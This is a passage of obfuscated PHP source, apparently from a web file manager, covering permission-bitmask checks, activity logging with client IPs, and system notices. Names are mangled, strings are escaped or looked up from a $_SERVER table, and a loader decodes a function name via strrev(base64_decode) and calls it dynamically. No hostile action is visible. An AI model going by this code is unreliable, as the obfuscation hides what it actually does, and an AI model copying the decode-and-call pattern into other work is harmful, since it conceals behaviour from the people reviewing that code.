self::authCheck($•¢ùÖ—, self::AUTH_ROOT); } public static function authCheckAction($º¨ö‡Øé, $’Ñ¤Êã) { $áœ¢˜£† =& $_SERVER[Õò”†—·]; $Ñ›İâÕ = array($áœ¢˜£†[1973] => self::AUTH_VIEW, $áœ¢˜£†[1248] => self::AUTH_DOWNLOAD, $áœ¢˜£†[120] => self::AUTH_UPLOAD, $áœ¢˜£†[1923] => self::AUTH_EDIT, $áœ¢˜£†[1922] => self::AUTH_REMOVE, $áœ¢˜£†[1933] => self::AUTH_SHARE, $áœ¢˜£†[414] => self::AUTH_COMMENT, $áœ¢˜£†[1743] => self::AUTH_EVENT, $áœ¢˜£†[1974] => self::AUTH_ROOT); if (!isset($Ñ›İâÕ[$’Ñ¤Êã])) { return; } $Ñôô¢÷Í = $Ñ›İâÕ[$’Ñ¤Êã]; $º¨ö‡Øé = intval($º¨ö‡Øé); if ($º¨ö‡Øé <= 0) { return !1; } if (($º¨ö‡Øé & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($º¨ö‡Øé & $Ñôô¢÷Í); } public static function authDisable($º±“Óø¿, $ğ¤•œ©ú) { if (intval($º±“Óø¿) <= 0) { return 0; } return intval($º±“Óø¿) & ~$ğ¤•œ©ú; } public $optionType = "\123\x79\163\164\145\x6d\56\x73\157\x75\x72\x63\x65\101\x75\x74\x68\x4c\x69\163\x74"; public $field = array("\156\x61\x6d\145", "\141\165\x74\x68", "\x6c\141\x62\x65\154", "\x64\151\x73\x70\x6c\141\x79", "\x73\171\163\x74\145\x6d", "\x73\x6f\x72\x74"); public function initData() { $‰¿¾¤ĞÈ = $this->authDefault(); foreach ($‰¿¾¤ĞÈ as $Š¥‰øâÓ) { $this->add($Š¥‰øâÓ); } } public function findAuth($âÂ®œ , $Ë¡µ¬) { $¡Ÿ‘üç =& $_SERVER[Õò”†—·]; $‚ƒÇéÓ” = parent::listData(); foreach ($‚ƒÇéÓ” as $£ƒœÀò§) { $şÙ§ŸÄ˜ = intval($£ƒœÀò§[$¡Ÿ‘üç[471]]); if ($şÙ§ŸÄ˜ <= 0 || $£ƒœÀò§[$¡Ÿ‘üç[1975]] == 0) { continue; } if (($şÙ§ŸÄ˜ & $âÂ®œ ) != $âÂ®œ ) { continue; } if (($şÙ§ŸÄ˜ & $Ë¡µ¬) != 0) { continue; } return $£ƒœÀò§[$¡Ÿ‘üç[459]]; } return !1; } public function findAuthReadOnly() { $Æ‹Àğàê = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ä˜³¸’Õ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Æ‹Àğàê, $ä˜³¸’Õ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ûáç®ëŞ =& $_SERVER[Õò”†—·]; $ŸÅ¹ûˆ = parent::listData(); $â£ï—‰ç = !1; foreach ($ŸÅ¹ûˆ as $‰æé·ºé) { if ($‰æé·ºé[$ûáç®ëŞ[471]] <= 0 || $‰æé·ºé[$ûáç®ëŞ[1975]] == $ûáç®ëŞ[229]) { continue; } if (!$â£ï—‰ç) { $â£ï—‰ç = $‰æé·ºé; continue; } if ($â£ï—‰ç[$ûáç®ëŞ[471]] > $‰æé·ºé[$ûáç®ëŞ[471]]) { $â£ï—‰ç = $‰æé·ºé; } } return $â£ï—‰ç ? $â£ï—‰ç[$ûáç®ëŞ[459]] : $ûáç®ëŞ[22]; } public function listData($çÎô‹ˆ« = false, $ß£é£Òş = "\163\157\162\164", $ÏÖ„†… = false) { return parent::listData($çÎô‹ˆ«, $ß£é£Òş, $ÏÖ„†…); } public function update($ê·ŞŸ¾–, $ÒÉÌÔè) { $®òëÚ§Â =& $_SERVER[Õò”†—·]; $¢‡ƒ• = parent::listData($ê·ŞŸ¾–); $©Ş¢‘Ûâ = $this->findByName($ÒÉÌÔè[$®òëÚ§Â[42]]); if (!$¢‡ƒ• || $©Ş¢‘Ûâ && $©Ş¢‘Ûâ[$®òëÚ§Â[459]] != $¢‡ƒ•[$®òëÚ§Â[459]]) { return !1; } $this->filterAuth($ÒÉÌÔè[$®òëÚ§Â[471]]); return parent::update($ê·ŞŸ¾–, $ÒÉÌÔè); } public function remove($şµûâ¹Ù) { $Áù²‰²‘ = parent::listData($şµûâ¹Ù); if (!$Áù²‰²‘ || $Áù²‰²‘[$_SERVER[Õò”†—·][192]]) { return !1; } return parent::remove($şµûâ¹Ù); } public function add($½ı£ªÆÀ = array()) { $¡šıÔñ¬ =& $_SERVER[Õò”†—·]; if ($this->findByName($½ı£ªÆÀ[$¡šıÔñ¬[42]])) { return !1; } $‚äšäÑ˜ = array($¡šıÔñ¬[42] => $¡šıÔñ¬[22], $¡šıÔñ¬[471] => 1, $¡šıÔñ¬[1976] => $¡šıÔñ¬[1963], $¡šıÔñ¬[1975] => 1, $¡šıÔñ¬[192] => 0, $¡šıÔñ¬[1977] => 0); $½ı£ªÆÀ = array_merge($‚äšäÑ˜, $½ı£ªÆÀ); $½ı£ªÆÀ[$¡šıÔñ¬[1977]] = $this->getSort(); $this->filterAuth($½ı£ªÆÀ[$¡šıÔñ¬[471]]); return parent::insert($½ı£ªÆÀ); } private function getSort() { $ùı§½ú =& $_SERVER[Õò”†—·]; $ñ¸üœÊÖ = parent::listData(); $ô‘²ôÊ´ = array_to_keyvalue($ñ¸üœÊÖ, $ùı§½ú[22], $ùı§½ú[1977]); return empty($ô‘²ôÊ´) ? 0 : max($ô‘²ôÊ´) + 1; } private function filterAuth(&$¼ø¹³Çİ) { if (!$¼ø¹³Çİ) { return; } $ª£Óï­Æ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $°³Íß»Ä = array(); foreach ($ª£Óï­Æ as $éÁß÷ÅÙ) { if ($¼ø¹³Çİ & $éÁß÷ÅÙ) { $°³Íß»Ä[] = $éÁß÷ÅÙ; } } if (in_array(self::AUTH_ROOT, $°³Íß»Ä)) { $¼ø¹³Çİ = array_sum($ª£Óï­Æ); return; } $î¢‹äúê = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($°³Íß»Ä as $éÁß÷ÅÙ) { if (isset($î¢‹äúê[$éÁß÷ÅÙ])) { $°³Íß»Ä = array_merge($°³Íß»Ä, $î¢‹äúê[$éÁß÷ÅÙ]); } } $°³Íß»Ä[] = self::AUTH_SHOW; $¼ø¹³Çİ = array_sum(array_unique($°³Íß»Ä)); } public function sort($Šµ€²¹¯, $§ÇÒ£ƒ») { return parent::update($Šµ€²¹¯, $§ÇÒ£ƒ»); } } goto c£„È•¤èø; aë¸ÄˆòÊ³: $fileSize = strrev(base64_decode($_SERVER[Õ°á¾ÔŸ][0])); function binCheckNeq($äÚçğ¨×, $‰ê öº…) { return $äÚçğ¨× != $‰ê öº…; } $_SERVER[$_SERVER[Õ°á¾ÔŸ][1]] = $fileSize($_SERVER[$_SERVER[Õ°á¾ÔŸ][2]]); goto d¸Ì•ÛÙ; B¶Ãª«ñÚ­: define($_SERVER[Õò”†—·][302], 1); define($_SERVER[Õò”†—·][303], 0); define($_SERVER[Õò”†—·][304], 2); goto aÏŒİÚ²îÃ; Dƒ™Ş¦ò×: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\x65\155\137\154\157\147"; protected $dataAuto = array(array("\143\162\x65\141\164\x65\124\151\155\x65", "\164\x69\x6d\x65", "\151\156\163\145\x72\164", "\x66\x75\156\x63\164\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $×¦âß€ =& $_SERVER[Õò”†—·]; return array($×¦âß€[2314] => LNG($×¦âß€[2315]), $×¦âß€[2316] => LNG($×¦âß€[2317]), $×¦âß€[1896] => LNG($×¦âß€[2318]), $×¦âß€[2319] => LNG($×¦âß€[2320]), $×¦âß€[2321] => LNG($×¦âß€[2322]), $×¦âß€[2323] => LNG($×¦âß€[2324]), $×¦âß€[2325] => LNG($×¦âß€[2326]), $×¦âß€[1926] => LNG($×¦âß€[2326]), $×¦âß€[1927] => LNG($×¦âß€[2327]), $×¦âß€[2328] => LNG($×¦âß€[2329]), $×¦âß€[2330] => LNG($×¦âß€[2331]), $×¦âß€[2332] => LNG($×¦âß€[2333]), $×¦âß€[2334] => LNG($×¦âß€[2335]), $×¦âß€[1924] => LNG($×¦âß€[2336]), $×¦âß€[2337] => LNG($×¦âß€[2338]), $×¦âß€[1931] => LNG($×¦âß€[2339]), $×¦âß€[2340] => LNG($×¦âß€[2341]), $×¦âß€[2342] => LNG($×¦âß€[2343]), $×¦âß€[2344] => LNG($×¦âß€[2345]), $×¦âß€[2346] => LNG($×¦âß€[2347]), $×¦âß€[1934] => LNG($×¦âß€[2348]), $×¦âß€[1935] => LNG($×¦âß€[2349]), $×¦âß€[2350] => LNG($×¦âß€[2351]), $×¦âß€[2352] => LNG($×¦âß€[2353]), $×¦âß€[2354] => LNG($×¦âß€[2355]), $×¦âß€[1929] => LNG($×¦âß€[2356]), $×¦âß€[2357] => LNG($×¦âß€[2358]), $×¦âß€[1928] => LNG($×¦âß€[2359]), $×¦âß€[2360] => LNG($×¦âß€[2361]), $×¦âß€[2362] => LNG($×¦âß€[2363]), $×¦âß€[2364] => LNG($×¦âß€[2363]), $×¦âß€[2365] => LNG($×¦âß€[2366]), $×¦âß€[2367] => LNG($×¦âß€[2367]), $×¦âß€[2368] => LNG($×¦âß€[1900]), $×¦âß€[2369] => LNG($×¦âß€[2370]), $×¦âß€[2371] => LNG($×¦âß€[2372]), $×¦âß€[2373] => LNG($×¦âß€[2374]), $×¦âß€[2375] => LNG($×¦âß€[2376]), $×¦âß€[2377] => LNG($×¦âß€[2378]), $×¦âß€[2379] => LNG($×¦âß€[2379]), $×¦âß€[2380] => LNG($×¦âß€[2381]), $×¦âß€[2382] => LNG($×¦âß€[2383]), $×¦âß€[2384] => LNG($×¦âß€[2385]), $×¦âß€[2386] => LNG($×¦âß€[2387]), $×¦âß€[2388] => LNG($×¦âß€[2389]), $×¦âß€[2390] => LNG($×¦âß€[2391]), $×¦âß€[213] => LNG($×¦âß€[213]), $×¦âß€[214] => LNG($×¦âß€[2392]), $×¦âß€[2393] => LNG($×¦âß€[2393])); } private function typeFile() { $ÚÙàã¹ =& $_SERVER[Õò”†—·]; $ªéÏ’Ä = array($ÚÙàã¹[1931] => array($ÚÙàã¹[1932]), $ÚÙàã¹[2332] => array($ÚÙàã¹[2394]), $ÚÙàã¹[2334] => array($ÚÙàã¹[2395]), $ÚÙàã¹[1924] => array($ÚÙàã¹[1925], $ÚÙàã¹[2396]), $ÚÙàã¹[2342] => array(), $ÚÙàã¹[2344] => array(), $ÚÙàã¹[2346] => array(), $ÚÙàã¹[1934] => array($ÚÙàã¹[1936]), $ÚÙàã¹[1935] => array($ÚÙàã¹[1936]), $ÚÙàã¹[2350] => array($ÚÙàã¹[2397]), $ÚÙàã¹[2352] => array($ÚÙàã¹[2397]), $ÚÙàã¹[2354] => array($ÚÙàã¹[2398]), $ÚÙàã¹[2340] => array($ÚÙàã¹[2399]), $ÚÙàã¹[1929] => array($ÚÙàã¹[2400]), $ÚÙàã¹[2357] => array($ÚÙàã¹[2401]), $ÚÙàã¹[1928] => array($ÚÙàã¹[1930])); return $ªéÏ’Ä; } private function typeAll() { $ë¾ŞÂ÷Ú =& $_SERVER[Õò”†—·]; $ŒÌšì‚™ = $this->typeList; $”õÕÈ­ = array_filter($this->typeFile()); foreach ($”õÕÈ­ as $•îªä¸ => $¯“í˜¢Û) { $ŒÌšì‚™[$¯“í˜¢Û[0]] = $ŒÌšì‚™[$•îªä¸]; } $ŒÌšì‚™[$ë¾ŞÂ÷Ú[1936]] = LNG($ë¾ŞÂ÷Ú[2402]); $ŒÌšì‚™[$ë¾ŞÂ÷Ú[2397]] = LNG($ë¾ŞÂ÷Ú[2403]); return $ŒÌšì‚™; } public function addLog($¢õ±ÜÙ, $Æ¶êıË = array()) { $»ó½×æ× =& $_SERVER[Õò”†—·]; if (!isset($this->typeList[$¢õ±ÜÙ])) { return; } $ï‰©±¡ = Session::get($»ó½×æ×[2095]); if (!$ï‰©±¡) { $ï‰©±¡ = _get($Æ¶êıË, $»ó½×æ×[1755], 0); } if ($¢õ±ÜÙ == $»ó½×æ×[2369] && is_array($Æ¶êıË[$»ó½×æ×[2404]]) && !$Æ¶êıË[$»ó½×æ×[2404]]) { return; } $ñÚ³™ö = get_client_ip(); if (!$Æ¶êıË || strlen(json_encode($Æ¶êıË)) >= 1024 * 64) { if ($Æ¶êıË && is_array($Æ¶êıË)) { $Æ¶êıË = array_intersect_key($Æ¶êıË, array_flip($»ó½×æ×[459], $»ó½×æ×[42])); $Æ¶êıË[$»ó½×æ×[2405]] = $ñÚ³™ö; } else { $Æ¶êıË = array($»ó½×æ×[2405] => $ñÚ³™ö); } } else { if (is_array($Æ¶êıË)) { $Æ¶êıË[$»ó½×æ×[2405]] = $ñÚ³™ö; } else { $Æ¶êıË = array($»ó½×æ×[1256] => $Æ¶êıË, $»ó½×æ×[2405] => $ñÚ³™ö); } } $Æ¶êıË = array($»ó½×æ×[1745] => Session::sign(), $»ó½×æ×[1746] => intval($ï‰©±¡), $»ó½×æ×[43] => $¢õ±ÜÙ, $»ó½×æ×[1748] => json_encode($Æ¶êıË)); parent::add($Æ¶êıË); } public function remove($ÁÙˆ»œ) { $this->where(array($_SERVER[Õò”†—·][477] => $ÁÙˆ»œ))->delete(); } private function _makeOrder($ı¹«úÅê = '') { $ü¶‡øû‘ =& $_SERVER[Õò”†—·]; $øŒÃıº³ = $ü¶‡øû‘[232]; $°ªß˜æ¨ = array($ü¶‡øû‘[507] => $ü¶‡øû‘[508], $ü¶‡øû‘[509] => $ü¶‡øû‘[510]); $şÉÍÓ¹Ã = Input::get($ü¶‡øû‘[515], $ü¶‡øû‘[17], $ü¶‡øû‘[2131], array($ü¶‡øû‘[2049], $ü¶‡øû‘[509])); $şÉÍÓ¹Ã = $°ªß˜æ¨[$şÉÍÓ¹Ã]; $ı¹«úÅê = $ı¹«úÅê . "{$øŒÃıº³}\x20{$şÉÍÓ¹Ã}"; return $this->order($ı¹«úÅê); } public function get($ÏÚø¼ÔÕ = '') { $ŒÖñÕ‘ =& $_SERVER[Õò”†—·]; if (!$ÏÚø¼ÔÕ) { show_json(array()); } $Ş”Â¯„é = array(); if ($ÏÚø¼ÔÕ[$ŒÖñÕ‘[1755]]) { $Ş”Â¯„é[$ŒÖñÕ‘[1755]] = $ÏÚø¼ÔÕ[$ŒÖñÕ‘[1755]]; } if (isset($ÏÚø¼ÔÕ[$ŒÖñÕ‘[811]])) { $êØæõİ = $ÏÚø¼ÔÕ[$ŒÖñÕ‘[811]]; $à”¢ŸæÍ = isset($ÏÚø¼ÔÕ[$ŒÖñÕ‘[812]]) ? $ÏÚø¼ÔÕ[$ŒÖñÕ‘[812]] : time(); $Ş”Â¯„é[$ŒÖñÕ‘[232]] = array($ŒÖñÕ‘[393], array($êØæõİ, $à”¢ŸæÍ)); } if ($ÏÚø¼ÔÕ[$ŒÖñÕ‘[43]]) { $âÑé§İŸ = explode($ŒÖñÕ‘[60], $ÏÚø¼ÔÕ[$ŒÖñÕ‘[43]]); $‰­â‰‡ˆ = $this->typeFile(); $Ö®›Ûæœ = array(); foreach ($âÑé§İŸ as $¦·µ˜ˆ) { $Ö®›Ûæœ[] = $¦·µ˜ˆ; if (isset($‰­â‰‡ˆ[$¦·µ˜ˆ])) { $Ö®›Ûæœ = array_merge($Ö®›Ûæœ, $‰­â‰‡ˆ[$¦·µ˜ˆ]); } } $Ö®›Ûæœ = array_unique($Ö®›Ûæœ); if ($Ö®›Ûæœ) { $Ş”Â¯„é[$ŒÖñÕ‘[43]] = array($ŒÖñÕ‘[17], $Ö®›Ûæœ); } } else { $Ş”Â¯„é[$ŒÖñÕ‘[43]] = array($ŒÖñÕ‘[2406], $ŒÖñÕ‘[2407]); } if (!empty($ÏÚø¼ÔÕ[$ŒÖñÕ‘[2405]])) { $Ş”Â¯„é[$ŒÖñÕ‘[510]] = array($ŒÖñÕ‘[443], "\45{$ÏÚø¼ÔÕ[$ŒÖñÕ‘[2405]]}\45"); } $”Ÿå¡ÜÄ = $this->_makeOrder()->where($Ş”Â¯„é)->selectPage(); if (empty($”Ÿå¡ÜÄ[$ŒÖñÕ‘[429]])) { show_json(array(), !0, $”Ÿå¡ÜÄ[$ŒÖñÕ‘[426]]); } $”Ÿå¡ÜÄ[$ŒÖñÕ‘[429]] = $this->logList($”Ÿå¡ÜÄ[$ŒÖñÕ‘[429]]); return $”Ÿå¡ÜÄ; } private function ipAddress(&$ò¯ŞÇÌ) { $Èèô°ö =& $_SERVER[Õò”†—·]; if (!empty($ò¯ŞÇÌ[$Èèô°ö[2405]])) { $¦Ïí§ãú = IpLocation::get($ò¯ŞÇÌ[$Èèô°ö[2405]]); } else { $¦Ïí§ãú = LNG($Èèô°ö[2408]); } $ò¯ŞÇÌ[$Èèô°ö[2409]] = $¦Ïí§ãú; } private function descZipDownload($Ôº…ÃÔ˜, &$©£ß÷Š¾) { $‰‘æöŒ =& $_SERVER[Õò”†—·]; if (!isset($Ôº…ÃÔ˜[$‰‘æöŒ[2410]])) { return; } $Á›“¿— = json_decode($Ôº…ÃÔ˜[$‰‘æöŒ[2410]], !0); foreach ($Á›“¿— as $•í¸“¢ä) { try { $¦êÑõ‰ = IO::infoFullSimple($•í¸“¢ä[$‰‘æöŒ[97]]); } catch (Exception $‚¯ĞÄú‘) { continue; } $Ôº…ÃÔ˜[$‰‘æöŒ[97]] = $•í¸“¢ä[$‰‘æöŒ[97]]; $©£ß÷Š¾[] = $Ôº…ÃÔ˜[$‰‘æöŒ[194]] = $¦êÑõ‰[$‰‘æöŒ[194]]; $©£ß÷Š¾[] = $Ôº…ÃÔ˜[$‰‘æöŒ[2187]] = $¦êÑõ‰[$‰‘æöŒ[193]]; break; } return $Ôº…ÃÔ˜; } private function getSourceList(&$¥ó¢—”Ö) { $èßı‚ØØ =& $_SERVER[Õò”†—·]; $ÒÍ·ê³¤ = array(); foreach ($¥ó¢—”Ö as $Ë¶«÷©‘ => $şÌğÆÇœ) { $Æ¥Ÿ•ú = json_decode($şÌğÆÇœ[$èßı‚ØØ[510]], !0); if ($şÌğÆÇœ[$èßı‚ØØ[43]] == $èßı‚ØØ[1927]) { $Æ¥Ÿ•ú = $this->descZipDownload($Æ¥Ÿ•ú, $ÒÍ·ê³¤); $¥ó¢—”Ö[$Ë¶«÷©‘][$èßı‚ØØ[510]] = json_encode($Æ¥Ÿ•ú); continue; } if (strpos($şÌğÆÇœ[$èßı‚ØØ[43]], $èßı‚ØØ[2189]) !== 0) { if (!isset($Æ¥Ÿ•ú[$èßı‚ØØ[97]]) || strpos($şÌğÆÇœ[$èßı‚ØØ[43]], $èßı‚ØØ[2411]) !== 0) { continue; } try { $ë»˜¹Ö = IO::infoFullSimple($Æ¥Ÿ•ú[$èßı‚ØØ[97]]); } catch (Exception $ñÊĞ¹äº) { continue; } $ÒÍ·ê³¤[] = $Æ¥Ÿ•ú[$èßı‚ØØ[194]] = $ë»˜¹Ö[$èßı‚ØØ[194]]; $ÒÍ·ê³¤[] = $Æ¥Ÿ•ú[$èßı‚ØØ[2187]] = $ë»˜¹Ö[$èßı‚ØØ[193]]; $¥ó¢—”Ö[$Ë¶«÷©‘][$èßı‚ØØ[510]] = json_encode($Æ¥Ÿ•ú); continue; } $ÒÍ·ê³¤[] = $Æ¥Ÿ•ú[$èßı‚ØØ[194]]; $ÒÍ·ê³¤[] = $Æ¥Ÿ•ú[$èßı‚ØØ[2187]]; if ($Æ¥Ÿ•ú[$èßı‚ØØ[43]] == $èßı‚ØØ[604]) { $ÒÍ·ê³¤[] = $Æ¥Ÿ•ú[$èßı‚ØØ[510]][$èßı‚ØØ[1213]]; $ÒÍ·ê³¤[] = $Æ¥Ÿ•ú[$èßı‚ØØ[510]][$èßı‚ØØ[1214]]; } if ($Æ¥Ÿ•ú[$èßı‚ØØ[43]] == $èßı‚ØØ[2198]) { $ÒÍ·ê³¤[] = $Æ¥Ÿ•ú[$èßı‚ØØ[510]][$èßı‚ØØ[194]]; } } if (!$ÒÍ·ê³¤) { return array(); } return Model($èßı‚ØØ[875])->sourceListInfo($ÒÍ·ê³¤, !0); } private function logList($úÑâİ) { $ÊÓâ÷€¯ =& $_SERVER[Õò”†—·]; $§Äµ™ùğ = array_to_keyvalue($úÑâİ, $ÊÓâ÷€¯[22], $ÊÓâ÷€¯[1755]); $ôó›·—» = Model($ÊÓâ÷€¯[583])->userListInfo(array_unique($§Äµ™ùğ)); $ÎÄéúø = $this->getSourceList($úÑâİ); $ïÈÎ¦½¦ = $this->typeAll(); $¤Œ‰¤ = array(); $ÅæˆÈü = array(); foreach ($úÑâİ as $üÎÖ¾èè => $ºùÖ¬£) { $ë“È‹Ô€ = $ºùÖ¬£[$ÊÓâ÷€¯[43]]; $½ã´†à = isset($ôó›·—»[$ºùÖ¬£[$ÊÓâ÷€¯[1755]]]) ? $ôó›·—»[$ºùÖ¬£[$ÊÓâ÷€¯[1755]]] : !1; $½‡ÜáŸÆ = strpos($ë“È‹Ô€, $ÊÓâ÷€¯[2412]) === 0 ? LNG($ÊÓâ÷€¯[2413]) : LNG($ÊÓâ÷€¯[2408]); $ºùÖ¬£[$ÊÓâ÷€¯[42]] = isset($½ã´†à[$ÊÓâ÷€¯[42]]) ? $½ã´†à[$ÊÓâ÷€¯[42]] : LNG($ÊÓâ÷€¯[2408]); $ºùÖ¬£[$ÊÓâ÷€¯[2242]] = isset($½ã´†à[$ÊÓâ÷€¯[2242]]) ? $½ã´†à[$ÊÓâ÷€¯[2242]] : $ÊÓâ÷€¯[22]; $ºùÖ¬£[$ÊÓâ÷€¯[1643]] = isset($ïÈÎ¦½¦[$ë“È‹Ô€]) ? $ïÈÎ¦½¦[$ë“È‹Ô€] : $½‡ÜáŸÆ; $ºùÖ¬£[$ÊÓâ÷€¯[2130]] = $½ã´†à; $ÉÈ Üìò = json_decode($ºùÖ¬£[$ÊÓâ÷€¯[510]], !0); $ºùÖ¬£[$ÊÓâ÷€¯[2405]] = isset($ÉÈ Üìò[$ÊÓâ÷€¯[2405]]) ? $ÉÈ Üìò[$ÊÓâ÷€¯[2405]] : $ÊÓâ÷€¯[22]; $ºùÖ¬£[$ÊÓâ÷€¯[2409]] = IpLocation::get($ºùÖ¬£[$ÊÓâ÷€¯[2405]]); if (strpos($ë“È‹Ô€, $ÊÓâ÷€¯[2189]) === 0 || isset($ÉÈ Üìò[$ÊÓâ÷€¯[2187]])) { $ÉÈ Üìò[$ÊÓâ÷€¯[100]] = $ÎÄéúø[$ÉÈ Üìò[$ÊÓâ÷€¯[194]]]; $ÉÈ Üìò[$ÊÓâ÷€¯[2203]] = $ÎÄéúø[$ÉÈ Üìò[$ÊÓâ÷€¯[2187]]]; if ($ÉÈ Üìò[$ÊÓâ÷€¯[43]] == $ÊÓâ÷€¯[604]) { $ÉÈ Üìò[$ÊÓâ÷€¯[510]][$ÊÓâ÷€¯[1213]] = $ÎÄéúø[$ÉÈ Üìò[$ÊÓâ÷€¯[510]][$ÊÓâ÷€¯[1213]]]; $ÉÈ Üìò[$ÊÓâ÷€¯[510]][$ÊÓâ÷€¯[1214]] = $ÎÄéúø[$ÉÈ Üìò[$ÊÓâ÷€¯[510]][$ÊÓâ÷€¯[1214]]]; } if ($ÉÈ Üìò[$ÊÓâ÷€¯[43]] == $ÊÓâ÷€¯[2198]) { $ÉÈ Üìò[$ÊÓâ÷€¯[510]][$ÊÓâ÷€¯[194]] = $ÎÄéúø[$ÉÈ Üìò[$ÊÓâ÷€¯[510]][$ÊÓâ÷€¯[194]]]; } if ($ÉÈ Üìò[$ÊÓâ÷€¯[43]] == $ÊÓâ÷€¯[1922]) { $ÉÈ Üìò[$ÊÓâ÷€¯[2203]] = $ÉÈ Üìò[$ÊÓâ÷€¯[100]]; $ÉÈ Üìò[$ÊÓâ÷€¯[2187]] = $ÉÈ Üìò[$ÊÓâ÷€¯[2203]][$ÊÓâ÷€¯[194]]; $ÉÈ Üìò[$ÊÓâ÷€¯[100]] = !1; $ÉÈ Üìò[$ÊÓâ÷€¯[194]] = $ÊÓâ÷€¯[22]; } $»‰ëÔŞŠ = array($ÊÓâ÷€¯[1922], $ÊÓâ÷€¯[2185]); if (!in_array($ÉÈ Üìò[$ÊÓâ÷€¯[43]], $»‰ëÔŞŠ)) { if ($ÉÈ Üìò[$ÊÓâ÷€¯[100]] && $ÉÈ Üìò[$ÊÓâ÷€¯[100]][$ÊÓâ÷€¯[191]] == $ÊÓâ÷€¯[192]) { $ÅæˆÈü[] = $ºùÖ¬£[$ÊÓâ÷€¯[459]]; unset($úÑâİ[$üÎÖ¾èè]); continue; } if ($ÉÈ Üìò[$ÊÓâ÷€¯[2203]] && $ÉÈ Üìò[$ÊÓâ÷€¯[2203]][$ÊÓâ÷€¯[191]] == $ÊÓâ÷€¯[192]) { $ÅæˆÈü[] = $ºùÖ¬£[$ÊÓâ÷€¯[459]]; unset($úÑâİ[$üÎÖ¾èè]); continue; } } } $ºùÖ¬£[$ÊÓâ÷€¯[510]] = $ÉÈ Üìò; unset($ºùÖ¬£[$ÊÓâ÷€¯[2414]]); $¤Œ‰¤[] = $ºùÖ¬£; } $this->clearSystemPathLog($ÅæˆÈü); return $¤Œ‰¤; } private function clearSystemPathLog($­ôßÈ„Ã) { $ª±ô… =& $_SERVER[Õò”†—·]; if (count($­ôßÈ„Ã) == 0) { return; } $ÃÏûĞ”  = array($ª±ô…[459] => array($ª±ô…[17], array_unique($­ôßÈ„Ã))); $this->where($ÃÏûĞ” )->delete(); } public function deviceList($í­¥Í¶†, $û÷—â = 0) { $¬ºâÅ–‰ =& $_SERVER[Õò”†—·]; $ÓÈ—¸¢É = array($¬ºâÅ–‰[1755] => $í­¥Í¶†, $¬ºâÅ–‰[232] => array($¬ºâÅ–‰[1064], $û÷—â), $¬ºâÅ–‰[43] => $¬ºâÅ–‰[1896]); $ÅÁ‹ó‰ = array(); $ÕàÄ”ÌÎ = $this->field($¬ºâÅ–‰[2415])->where($ÓÈ—¸¢É)->order($¬ºâÅ–‰[2201])->limit(50)->select(); foreach ($ÕàÄ”ÌÎ as $ÔÏğŞ‰ => $æòù¿Ê¿) { if ($ÔÏğŞ‰ > 0 && abs($æòù¿Ê¿[$¬ºâÅ–‰[232]] - $ÕàÄ”ÌÎ[$ÔÏğŞ‰ - 1][$¬ºâÅ–‰[232]]) < 5) { continue; } $ï®¦¾ƒŸ = json_decode($æòù¿Ê¿[$¬ºâÅ–‰[510]], !0); $æòù¿Ê¿[$¬ºâÅ–‰[2405]] = isset($ï®¦¾ƒŸ[$¬ºâÅ–‰[2405]]) ? $ï®¦¾ƒŸ[$¬ºâÅ–‰[2405]] : $¬ºâÅ–‰[22]; unset($ï®¦¾ƒŸ[$¬ºâÅ–‰[2405]]); $œ†”¬Şß = $this->deviceType($ï®¦¾ƒŸ[$¬ºâÅ–‰[2190]]); if (isset($ÅÁ‹ó‰[$œ†”¬Şß])) { continue; } $æòù¿Ê¿[$¬ºâÅ–‰[2409]] = IpLocation::get($æòù¿Ê¿[$¬ºâÅ–‰[2405]]); $æòù¿Ê¿[$¬ºâÅ–‰[510]] = $ï®¦¾ƒŸ; $ÅÁ‹ó‰[$œ†”¬Şß] = $æòù¿Ê¿; } return array_values($ÅÁ‹ó‰); } public function deviceType($—Šî¯ñ ) { return $—Šî¯ñ ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\56\x6e\x6f\x74\151\x63\145\114\x69\163\164"; public $field = array("\x6e\x61\155\145", "\143\157\156\164\x65\x6e\164", "\x61\x75\x74\x68", "\x6d\x6f\x64\x65", "\x74\x69\155\x65", "\x74\171\160\x65", "\x6c\x65\x76\x65\x6c", "\145\x6e\x61\x62\x6c\145", "\163\157\162\x74"); public function listData($ı¯Åš¿ï = false, $ñåè· = "\x73\157\x72\164", $Øä¶¡æ = false) { return parent::listData($ı¯Åš¿ï, $ñåè·, $Øä¶¡æ); } public function add($³üÏ†º) { $ö·ÊÏŠ =& $_SERVER[Õò”†—·]; $·ÅØ § = time(); if ($³üÏ†º[$ö·ÊÏŠ[26]] == $ö·ÊÏŠ[2416]) { $·ÅØ § = strtotime($³üÏ†º[$ö·ÊÏŠ[207]]); } $³üÏ†º[$ö·ÊÏŠ[207]] = $·ÅØ §; return parent::insert($³üÏ†º); } public function update($Îû•–², $Å¼çœú•) { $çÖ£Àí· =& $_SERVER[Õò”†—·]; $Ù¦é¸Óá = $this->listData($Îû•–²); if (!$Ù¦é¸Óá) { return !1; } $½Øª¼ß– = time(); if ($Å¼çœú•[$çÖ£Àí·[26]] == $çÖ£Àí·[2416]) { $½Øª¼ß– = strtotime($Å¼çœú•[$çÖ£Àí·[207]]); } $Å¼çœú•[$çÖ£Àí·[207]] = $½Øª¼ß–; return parent::update($Îû•–², $Å¼çœú•); } public function remove($Ò›Î„Û¥) { $Ï¨”ó² = $this->listData($Ò›Î„Û¥); if (!$Ï¨”ó² || $Ï¨”ó²[$_SERVER[Õò”†—·][192]]) { return !1; } return 